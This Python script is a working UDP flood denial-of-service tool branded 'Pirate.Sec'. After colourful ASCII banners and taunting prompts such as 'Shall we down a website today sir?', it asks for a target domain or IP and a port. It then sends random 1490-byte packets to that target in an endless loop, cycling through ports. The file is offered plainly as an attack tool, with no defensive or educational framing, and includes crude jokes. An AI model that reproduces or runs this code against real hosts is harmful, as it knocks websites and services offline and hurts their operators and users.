'''



'''



from platform import system
import os
import time
import random
import socket
from urllib import request
import sys
path=os.getcwd()
path=os.path.join(path,'lib')
sys.path.append(path)         
\


import colorama
from colorama import Fore,Back,Style
from tqdm.auto import tqdm
de_version="1.1"
colorama.init()
def clearConsole():
    command = 'clear'
    if os.name in ('nt', 'dos'):  
        command = 'cls'
    os.system(command)
    
def ddos():    
    def banner():
        clearConsole()
        print(Fore.BLUE+'''
                                                      
                                        ,-.
                                       ("O_)
                                      / `-/
                                     /-. /
                                    /   )
                                   /   /  
                                  /-. /
                    (_)"-._     /   )     Give me your port's.
                       "-._ "-'""( )/           /
                         "-/"-._" `.           /
                           /     "-.'._       /
                           /\       /-._"-._
            _,---...__    /  ) _,-"/    "-(_)
        ___<__(|) _   ""-/  / /   /
         '  `----' ""-.   \/ /   /
                       )  ] /   /
               ____..-'   //   /                       )
           ,-""      __.,'/   /   ___                 /,
          /    ,--""/  / /   /,-""   """-.          ,'/
         [    (    /  / /   /  ,.---,_   `._   _,-','
          \    `-./  / /   /  /       `-._  """ ,-'
           `-._  /  / /   /_,'            ""--"
               "/  / /   /"         
               /  / /   /
              /  / /   /       "Cringe security? tut tut tut destroy it"
             /  |,'   /  
            :   /    /     
 ________.__   /    /       __                                  
\______   \__|___________ _/  |_  ____        ______ ____   ____  
 |     ___/  \_  __ \__  \\   __\/ __ \      /  ___// __ \_/ ___\ 
 |    |   |  ||  | \// __ \|  | \  ___/      \___ \\  ___/\  \___ 
 |____|   |__||__|  (____  /__|  \___  > /\ /____  >\___  >\___  >
                         \/          \/  \/      \/     \/     \/ 
    Distributed Denial of Service Attack by Pirate.Sec     
         
   '''+Style.RESET_ALL+Fore.GREEN+Style.BRIGHT+''' 
 Shall we down a website today sir? :3 
 ------------------------------------------------------------------------
 Warning do not use this tool if you have epilepsy or hate bright colour's 
 ------------------------------------------------------------------------     
 instagram acc :) https://www.instagram.com/pirate_sec/        
 ------------------
 beta version 1.0 
 ------------------
        '''+Style.RESET_ALL)

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)

    def chech_con():
        try:
            request.urlopen('https://www.google.co.in/',timeout=3)
        except KeyboardInterrupt:
            print(Fore.RED+Style.BRIGHT + "you gonna leave without a hug? :(" + Fore.RESET)
            exit()
        except:
            print(Fore.RED+Style.BRIGHT+'Fix your internet dude'+Fore.RESET)
            exit()
 
    try:
        print(Fore.CYAN+Style.BRIGHT+"𝙒𝙚𝙡𝙘𝙤𝙢𝙚 𝙡𝙤𝙖𝙙𝙞𝙣𝙜 𝙮𝙤𝙪 𝙞𝙣.......... "+Fore.RESET)
        for i in tqdm(range(30000)):
            print(end=Fore.MAGENTA+Style.BRIGHT+'\r')

        time.sleep(1)
        chech_con()

    except KeyboardInterrupt:
        print(Fore.RED +Style.BRIGHT+ "you gonna leave without a hug? :(" + Fore.RESET)
        exit()
    try:
        while True:
            banner()
            print(Fore.BLACK+Style.BRIGHT+"1."+Style.RESET_ALL+Fore.BLUE+" website domain"+Fore.BLACK+Style.BRIGHT+"\n2."+Style.RESET_ALL+Fore.RED+" IP adress"+Fore.BLACK+Style.BRIGHT+"\n3."+Style.RESET_ALL+Fore.GREEN+" leave :(")
            opt=str(input(Fore.RED+Style.BRIGHT+"\n>>> "+Fore.RESET))
            if opt=='1':
                domain=str(input(Fore.CYAN+Style.BRIGHT+"type in your target site (ex: google.com):"+Fore.RESET))
                ip=socket.gethostbyname(domain)
                break
            elif opt=='2':
                ip = input(Fore.CYAN+Style.BRIGHT+"taregt's IP  : "+Fore.RESET)
                break
            elif opt=='3':
                time.sleep(1)
                print(Fore.RED+"that was fun ( ಠ ͜ʖಠ)"+Fore.RESET)
                                                             
                exit()
            else:
                print(Fore.RED+'the fuck u doing lol thats not a option'+Fore.RESET)
                time.sleep(2)

        port =int(input(Fore.CYAN+Style.BRIGHT+"Port number: "+Fore.RESET))

        print(Fore.YELLOW+Style.BRIGHT+"starting....."+Style.RESET_ALL)
        clearConsole()
        time.sleep(2)

        print(Fore.RED+Back.LIGHTGREEN_EX+"the kool fuck up site attack is starting......"+Style.RESET_ALL)
        for i in tqdm(range(30000)):
            print(end=Fore.MAGENTA+'\r')
        time.sleep(1)
        sent = 0
    except Exception as e:
        print(Fore.RED+'''
              ,---------------------------,
              |  /---------------------\  |
              | |                       | |
              | |     ERROR 404         | |
              | |   (╯°□°）╯︵ ┻━┻       | |    error this might help http://www.dolekemp96.org/main.htm 
              | |                       | |          /
              | |                       | |         / 
              |  \_____________________/  |        /
              |___________________________|       /
            ,---\_____     []     _______/------,
          /         /______________\           /|
        /___________________________________ /  | ___
        |                                   |   |    )
        |  _ _ _                 [-------]  |   |   (
        |  o o o                 [-------]  |  /    _)_
        |__________________________________ |/     /  /
    /-------------------------------------/|      ( )/
  /-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/ /
/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/ /
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      
           
                  
    
                
''')
        print("Reason: ",e,Fore.RESET)
        time.sleep(3)
        ddos()
    try:
        while True:
            sock.sendto(bytes, (ip,port))
            sent=sent+1
            port=port+1
            color_list = [Fore.RED+Style.BRIGHT+Back.MAGENTA, Fore.GREEN+Style.BRIGHT+Back.RED, Fore.YELLOW+Style.BRIGHT+Back.GREEN, Fore.BLUE+Style.BRIGHT+Back.CYAN, Fore.MAGENTA+Style.BRIGHT+Back.WHITE, Fore.CYAN+Style.BRIGHT+Back.BLUE, Fore.WHITE+Style.BRIGHT+Back.RED ]
            color_random = random.choice(color_list)

            print(color_random+"packet% s sent% s through port:% s" % (sent, ip, port))
            if port==65534:
                port=1
            elif port==1900:
                port=1901
    except Exception as e:
        print(Fore.RED+Style.BRIGHT+'''       
       __                                        has it been done master?
      <  \                                            /
[\\\\\\(\ (:::<======================================-
\<      >  \
 \\    /    |
  `==='____/


''',e,Fore.RESET)
        time.sleep(3)
        ddos()
    except KeyboardInterrupt:
       print(Fore.RED+'''
Attack quit by user. 
   '''+Style.RESET_ALL+Fore.GREEN+Style.BRIGHT+''' 
 _______  _______  _______  ______   _______  __   __  _______   
|       ||       ||       ||      | |  _    ||  | |  ||       |  
|    ___||   _   ||   _   ||  _    || |_|   ||  |_|  ||    ___|  
|   | __ |  | |  ||  | |  || | |   ||       ||       ||   |___   
|   ||  ||  |_|  ||  |_|  || |_|   ||  _   | |_     _||    ___|  
|   |_| ||       ||       ||       || |_|   |  |   |  |   |___   
|_______||_______||_______||______| |_______|  |___|  |_______|  
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
        ▄▀░░░░░░░░░░░░▄░░░░░░░▀▄
        █░░▄░░░░▄░░░░░░░░░░░░░░█
        █░░░░░░░░░░░░▄█▄▄░░▄░░░█ ▄▄▄
 ▄▄▄▄▄  █░░░░░░▀░░░░▀█░░▀▄░░░░░█▀▀░██
 ██▄▀██▄█░░░▄░░░░░░░██░░░░▀▀▀▀▀░░░░██
  ▀██▄▀██░░░░░░░░▀░██▀░░░░░░░░░░░░░▀██
    ▀████░▀░░░░▄░░░██░░░▄█░░░░▄░▄█░░██
       ▀█░░░░▄░░░░░██░░░░▄░░░▄░░▄░░░██
       ▄█▄░░░░░░░░░░░▀▄░░▀▀▀▀▀▀▀▀░░▄▀
      █▀▀█████████▀▀▀▀████████████▀
       ████▀  ███▀      ▀███  ▀██▀
         
        '''+Style.RESET_ALL)
                                                      

   


ddos()
